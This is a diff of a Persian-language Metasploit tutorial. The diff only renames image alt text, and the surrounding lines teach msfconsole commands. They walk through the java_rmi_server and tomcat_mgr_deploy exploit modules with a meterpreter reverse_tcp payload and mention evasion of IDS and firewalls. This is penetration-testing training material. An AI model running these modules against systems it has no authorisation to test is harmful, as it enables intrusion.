@@ -27,10 +27,10 @@ draft = false
 1. **See MSFConsole Commands with `help`**
 	1. در MSFConsole کامند های زیادی وجود دارد که برای مشاهده آنها میتوانیم از کامند `help` استفاده کنیم.
 	2. این کامندها در دسته بندی های متفاوت استفاده و نمایش داده میشوند که در تصویر زیر میتوانید مشاهده کنید:
-		1. ![Alt text](/images/tools/Pastedimage20250703164923.png)
-		2. ![Alt text](/images/tools/Pastedimage20250703164925.png)
-		3. ![Alt text](/images/tools/Pastedimage20250703164927.png)
-		4. ![Alt text](/images/tools/Pastedimage20250703164954.png)
+		1. ![MSFConsole Commands-1](/images/tools/Pastedimage20250703164923.png)
+		2. ![MSFConsole Commands-2](/images/tools/Pastedimage20250703164925.png)
+		3. ![MSFConsole Commands-3](/images/tools/Pastedimage20250703164927.png)
+		4. ![MSFConsole Commands-4](/images/tools/Pastedimage20250703164954.png)
 ```sh
 msfconsole -q
 
@@ -39,29 +39,29 @@ msf > help
 ##### MSFConsole Commands Description
 1. *Report Commands:*
 	1. این کامند ها بصورت کامل و همیشه در کنسول کار میکنند و برای کارهای کلی استفاده میشوند:
-		1. ![Alt text](/images/tools/Pastedimage20250703165130.png)
+		1. ![MSFConsole Commands-5](/images/tools/Pastedimage20250703165130.png)
 	2. این کامندها مختص به ماژول خاصی نیستند و بصورت مستقل کارهایی را انجام میدهند.
 2. *Module Commands:*
 	1. این نوع از کامندها برای کار با انواع ماژول ها(Exploits, Payloads, ....) استفاده میشوند:
-		1. ![Alt text](/images/tools/Pastedimage20250703165252.png)
+		1. ![MSFConsole Commands-6](/images/tools/Pastedimage20250703165252.png)
 3. *Jobs Commands:*
 	1. این کامند ها برای مدیریت کنترلر ها، ارتباطات ورودی و ... بکار میروند:
-		1. ![Alt text](/images/tools/Pastedimage20250703165421.png)
+		1. ![MSFConsole Commands-7](/images/tools/Pastedimage20250703165421.png)
 4. *Resources Commands:*
 	1. این کامندها برای Automation کردن کارها و تست نفوذ استفاده میشوند:
-		1. ![Alt text](/images/tools/Pastedimage20250703165516.png)
+		1. ![MSFConsole Commands-8](/images/tools/Pastedimage20250703165516.png)
 5. *Developer Commands:*
 	1. این نوع از کامندها برای توسعه MSFConsole استفاده میشود. 
 	2. مثلا MSFConsole با زبان Ruby توسعه داده شده است و به همین دلیل با کامند `irb` میتوانیم به Shell Ruby دسترسی داشته باشیم:
-		1. ![Alt text](/images/tools/Pastedimage20250703165711.png)
+		1. ![MSFConsole Commands-9](/images/tools/Pastedimage20250703165711.png)
 6. *Database Commands:*
 	1. این کامندها برای کار با دیتابیس MSFConsole مثلا Export, Import, Connect, Disconnect و ... استفاده میشود:
-		1. ![Alt text](/images/tools/Pastedimage20250703165817.png)
+		1. ![MSFConsole Commands-10](/images/tools/Pastedimage20250703165817.png)
 	2. یکی از ویژگی های پرکاربرد این است که میتوانیم اسکن Nmap را انجام دهیم و مستقیما آنرا در دیتابیس ذخیره کنیم. اینکار را با کامند `db_nmap` میتوانیم پیاده سازی کنیم:
-		1. ![Alt text](/images/tools/Pastedimage20250703165945.png)
+		1. ![MSFConsole Commands-11](/images/tools/Pastedimage20250703165945.png)
 7. *Credentials Commands:*
 	1. در هنگام تست نفوذ ممکن است اعتبارات زیادی مانند Usernames, Passwords, Hashes و ... را بدست آوریم. حال با کامند `creds` میتوانیم این موضوع ها را مشاهده، اضافه و یا حذف کنیم:
-		1. ![Alt text](/images/tools/Pastedimage20250703170130.png)
+		1. ![MSFConsole Commands-12](/images/tools/Pastedimage20250703170130.png)
 #### E36: MSFConsole Commands - Part 1
 ##### MSFConsole Commands Summary
 - **Core Commands**:
@@ -86,81 +86,81 @@ msf > help
 	- مشاهده، ذخیره، حذف اعتبار نامه ها Credentials در دیتابیس
 	- `creds`
 - **Image**:
-	- ![Alt text](/images/tools/Pastedimage20250703175515.png)
+	- ![MSFConsole Commands-13](/images/tools/Pastedimage20250703175515.png)
 ##### See MSFConsole Commands in Action
 1. `banner`
 	1. در هر بار اجرا Metasploit Framework اگر بصورت معمولی اجرا شود Banner در ابتدا چاپ میشود.
 	2. حال این دستور میتواند بنر های مختلفی را نمایش دهد:
-		1. ![Alt text](/images/tools/Pastedimage20250703175745.png)
+		1. ![MSFConsole Commands-14](/images/tools/Pastedimage20250703175745.png)
 2. `color true | false | auto`
 	1. این کامند رنگ را برای دستورات مشخص میکند.
 3. `version`
 	1. نمایش ورژن فعالی `msfconsole`
-		1. ![Alt text](/images/tools/Pastedimage20250703175959.png)
+		1. ![MSFConsole Commands-15](/images/tools/Pastedimage20250703175959.png)
 4. **We Can run Shell Commands in `msfconsole`**
 	1. در `msfconsole` علاوه بر کامندهای داخلی میتوانیم کامندهای شل لینوکس را نیز اجرا کنیم:
-		1. ![Alt text](/images/tools/Pastedimage20250703180214.png)
+		1. ![MSFConsole Commands-16](/images/tools/Pastedimage20250703180214.png)
 5. `?` | `help` 
 	1. نمایش راهنمای دستورات بصورت کلی
 6. `help COMMAND`
 	1. نمایش راهنمای کامندی خاص
 	2. `help search`
-		1. ![Alt text](/images/tools/Pastedimage20250703180345.png)
+		1. ![MSFConsole Commands-17](/images/tools/Pastedimage20250703180345.png)
 7. `search NAME | MODULE | anythings`
 	1. برای جستجو در `msfconsole` استفاده میشود. مثلا برای جستجو ساده:
 	2. `search name:java`
-		1. ![Alt text](/images/tools/Pastedimage20250703180539.png)
+		1. ![MSFConsole Commands-18](/images/tools/Pastedimage20250703180539.png)
 	3. برای جستجو حرفه ای تر:
 	4. `search name:java rate:excellent date:2011`
-		1. ![Alt text](/images/tools/Pastedimage20250703180616.png)
+		1. ![MSFConsole Commands-19](/images/tools/Pastedimage20250703180616.png)
 	5. استفاده از grep در جستجو:
 	6. `search name:java | grep rmi`
-		1. ![Alt text](/images/tools/Pastedimage20250703180745.png)
+		1. ![MSFConsole Commands-20](/images/tools/Pastedimage20250703180745.png)
 8. `history`
 	1. فریم ورک `msfconsole` مانند شل تاریخچه ای از دستورات که در آن اجرا شده را نگه میدارد که میتوانیم با این کامند تاریخچه را مشاهده کنیم:
-		1. ![Alt text](/images/tools/Pastedimage20250703180931.png)
+		1. ![MSFConsole Commands-21](/images/tools/Pastedimage20250703180931.png)
 9. `spool` Save History in Specific File
 	1. از این کامند برای ذخیره History بصورت دستی در یک فایل مشخص استفاده میشود.
 	2. `spool ~/Desktop/msflog.txt`
 	3. با اجرای این کامند، تمام کامندهایی که پس از آن درون `msfconsole` تایپ میکنیم درون فایل `~/Desktop/msflog.txt` ذخیره میشود.
 	4. `cat Desktop/msflog.txt`
-		1. ![Alt text](/images/tools/Pastedimage20250703181241.png)
+		1. ![MSFConsole Commands-22](/images/tools/Pastedimage20250703181241.png)
 10. `save` Save `msfconsole` Configuration 
 	1. با استفاده از این کامند میتوانیم کانفیگ فعلی ابزار را ذخیره کنیم تا در صورت نیاز از آن استفاده کنیم.
 	2. `save`
-		1. ![Alt text](/images/tools/Pastedimage20250703181503.png)
+		1. ![MSFConsole Commands-23](/images/tools/Pastedimage20250703181503.png)
 	3. `cat /root/.msf4/config`
-		1. ![Alt text](/images/tools/Pastedimage20250703181559.png)
+		1. ![MSFConsole Commands-24](/images/tools/Pastedimage20250703181559.png)
 11. `quit` | `exit`  Quit from Metasploit Framework
 #### E37: MSFConsole Commands - Part 2
 ##### Commands Used After Select Exploit
 1. `show` Show Objects like(all, encoders, nops, exploits, options, plugins , ...)
 	1. برای نمایش اشیا درون Metasploit Framework از این کامند استفاده میکنیم.
 	2. `show nops` Show all Generators
-		1. ![Alt text](/images/tools/Pastedimage20250704163118.png)
+		1. ![MSFConsole Commands-25](/images/tools/Pastedimage20250704163118.png)
 	3. `show plugins` Show all plugins
 	4. `show encoders`
 	5. `show exploits`
 2. `info` See details information about Exploit
 	1. این کامند مانند `show options` کار میکند اما اطلاعات بسیار دقیق تری نسبت به Exploit انتخاب شده را نمایش میدهد:
-		1. ![Alt text](/images/tools/Pastedimage20250704164158.png)
-		2. ![Alt text](/images/tools/Pastedimage20250704164125.png)
+		1. ![MSFConsole Commands-26](/images/tools/Pastedimage20250704164158.png)
+		2. ![MSFConsole Commands-27](/images/tools/Pastedimage20250704164125.png)
 3. `show advanced` Show advanced options of selected exploit
 	1. پس از انتخاب یک Exploit گزینه های تنظیم آنرا با `show options` میتوانیم مشاهده کنیم.
 	2. برای مشاهده گزینه های پیشرفته تری که میتوانیم برای Exploit تنظیم کنیم از `show advanced` استفاده میکنیم:
-		1. ![Alt text](/images/tools/Pastedimage20250704164628.png)
+		1. ![MSFConsole Commands-28](/images/tools/Pastedimage20250704164628.png)
 4. `show targets` See all targets which selected Exploit support them
 	1. نوع سیستم عاملی که Exploit انتخاب شده میتواند بر روی آنها پیاده سازی شود را با استفاده از این کامند قابل مشاهده است.
 	2. `use exploit/multi/misc/java_rmi_server`
 	3. `show targets`
-		1. ![Alt text](/images/tools/Pastedimage20250704164943.png)
+		1. ![MSFConsole Commands-29](/images/tools/Pastedimage20250704164943.png)
 5. `show evasion` See all techniques exploit can use
 	1. بسیاری از Exploit ها را اگر بصورت معمولی استفاده کنیم توسط سیستم های Firewall, IDS, IPS شناسایی میشوند و در نتیجه با استفاده از تکنیکی باید این شناسایی را دور بزنیم.
 	2. حال پس از انتخاب Exploit برای مشاهده تکنیک هایی که این اکسپلویت با استفاده از آنها میتواند سیستم های امنیتی را دور بزند میتوانیم از کامند `show evasion` استفاده کنیم:
-		1. ![Alt text](/images/tools/Pastedimage20250704165334.png)
+		1. ![MSFConsole Commands-30](/images/tools/Pastedimage20250704165334.png)
 6. `show payloads` Show payloads can used in selected Exploit
 	1. برای نمایش Payload هایی که میتوانیم برای یک Exploit انتخاب شده استفاده کنیم از این کامند استفاده میشود:
-		1. ![Alt text](/images/tools/Pastedimage20250704165505.png)
+		1. ![MSFConsole Commands-31](/images/tools/Pastedimage20250704165505.png)
 	2. در واقع یک Exploit میتواند Payload های متفاوتی داشته باشد که باید بر اساس سیستم عامل تارگت انتخاب شود.
 7. `set VARIABLE` | `get VARIABLE` | `unset VARIABLE` Exploit Variables
 	1. برای تنظیم مقدار متغیر Exploit از `set VARIABLE` استفاده میکنیم.
@@ -174,7 +174,7 @@ msf > help
 	2. `sessions -i 3` Interaction with selected(3) session
 11. `background` get back from Exploited shell to MSFConsole Shell
 	1. وقتی با استفاده از `sessions -i 3` به یک Session متصل میشویم، برای بازگشت به MSFConsole از این کامند استفاده میکنیم:
-		1. ![Alt text](/images/tools/Pastedimage20250704170455.png)
+		1. ![MSFConsole Commands-32](/images/tools/Pastedimage20250704170455.png)
 ##### Find Suitable Exploit
 1. **Suitable `exploit` base on Target**:
 	1. برای یافتن Exploit مناسب تارگت، ابتدا باید Enumeration کاملی را بر روی تارگت خود انجام دهیم و سپس آسیب پذیری های درون تارگت را پیدا کنیم.
@@ -183,7 +183,7 @@ msf > help
 1. Run `msfconsole` & Use `exploit/multi/misc/java_rmi_server`
 	1. برای بدست آوردن نام کامل Exploit کافیست جستجو را انجام دهیم:
 	2. `search rmiregistry`
-		1. ![Alt text](/images/tools/Pastedimage20250704163854.png)
+		1. ![MSFConsole Commands-33](/images/tools/Pastedimage20250704163854.png)
 ```sh
 msf> search rmiregistry
 msf> use exploit/multi/misc/java_rmi_server
@@ -203,13 +203,13 @@ msf exploit(multi/misc/java_rmi_server) >
 ```
 - *Description:*
 	- `show advanced`
-		- ![Alt text](/images/tools/Pastedimage20250704164604.png)
+		- ![MSFConsole Commands-34](/images/tools/Pastedimage20250704164604.png)
 	- `show targets`
-		- ![Alt text](/images/tools/Pastedimage20250704165021.png)
+		- ![MSFConsole Commands-35](/images/tools/Pastedimage20250704165021.png)
 	- `show evasion`
-		- ![Alt text](/images/tools/Pastedimage20250704165108.png)
+		- ![MSFConsole Commands-36](/images/tools/Pastedimage20250704165108.png)
 	- `show payloads`
-		- ![Alt text](/images/tools/Pastedimage20250704165532.png)
+		- ![MSFConsole Commands-37](/images/tools/Pastedimage20250704165532.png)
 #### E38: MSFConsole Commands - Part 3
 ##### Advance Exploit Example with `multi/http/tomcat_mgr_deploy`
 1. **Select another exploit when using exploit**:
@@ -240,18 +240,18 @@ msf exploit (multi/http/tomcat_mgr_deploy) > exploit
 ```
 - *Description:*
 	- `msf exploit (multi/http/tomcat_mgr_deploy) > show options`
-		- ![Alt text](/images/tools/Pastedimage20250704171310.png)
+		- ![MSFConsole Commands-38](/images/tools/Pastedimage20250704171310.png)
 	- `msf exploit (multi/http/tomcat_mgr_deploy) > set PayLoad java/meterpreter/reverse_tcp`
 	- `msf exploit (multi/http/tomcat_mgr_deploy) > show options`
-		- ![Alt text](/images/tools/Pastedimage20250704171932.png)
+		- ![MSFConsole Commands-39](/images/tools/Pastedimage20250704171932.png)
 	- حال میتوانیم مشاهده کنیم که باید `HttpUsername, HttpPassword, LHOST ` را باید مقدار دهی کنیم.
 	- همچنین متغیر `target` را میتوانیم بصورت اختیاری بر اساس سیستم عامل تارگت خود تنظیم کنیم.
 	- مقدار `Rport` را نیز در صورتیکه پورت پیشفرض `80` مشغول است عوض میکنیم.
 	- `show options`
-		- ![Alt text](/images/tools/Pastedimage20250704172410.png)
+		- ![MSFConsole Commands-40](/images/tools/Pastedimage20250704172410.png)
 - *After `exploit` Description:*
 	- پس اجرا `exploit` میتوانیم یک Meterpreter Shell را دریافت کنیم که این شل با یوزر `tomcat` دریافت شده زیرا که متغیر `HttpUsername` را مقدار دهی کردیم:
-		- ![Alt text](/images/tools/Pastedimage20250704172634.png)
+		- ![MSFConsole Commands-41](/images/tools/Pastedimage20250704172634.png)
 	- `bg` | `background`
 		- این دو کامند از Meterpreter Shell به MSFConsole باز میگردد و شل Meterpreter Shell را در پس زمینه قرار میدهد.
 ##### `pushm` & `pupm` Commands
@@ -265,7 +265,7 @@ msf exploit (multi/http/tomcat_mgr_deploy) > use exploit/multi/misc/java_rmi_ser
 msf exploit(multi/misc/java_rmi_server) > exploit
 ```
 - با اجرای آخرین `exploit` نفوذ با ماژول `exploit/multi/misc/java_rmi_server` انجام میشود:
-	- ![Alt text](/images/tools/Pastedimage20250704173452.png)
+	- ![MSFConsole Commands-42](/images/tools/Pastedimage20250704173452.png)
 2. **`popm` Pop Last Module from Stack Memory**:
 	1. برای بازگشت به آخرین ماژول درون حافظه Stack از این کامند استفاده میشود.
 	2. در همین مثال که ماژول `exploit/multi/misc/java_rmi_server`  انتخاب شده و ماژول `exploit/multi/http/tomcat_mgr_deploy` درون حافظه Stack قرار دارد، با اجرای `popm` مجددا ماژول `exploit/multi/http/tomcat_mgr_deploy` به عنوان ماژول اول انتخاب میشود:
@@ -274,7 +274,7 @@ msf exploit(multi/misc/java_rmi_server) > popm
 msf exploit (multi/http/tomcat_mgr_deploy) >
 ```
 - Image:
-	- ![Alt text](/images/tools/Pastedimage20250704173920.png)
+	- ![MSFConsole Commands-43](/images/tools/Pastedimage20250704173920.png)
 
 > [!Tip] 
 > این دو کامند در زمانی که میخواهیم چندین Exploit را بر روی چندین Target پیاده سازی کنیم بسیار کاربردی و پر استفاده است.
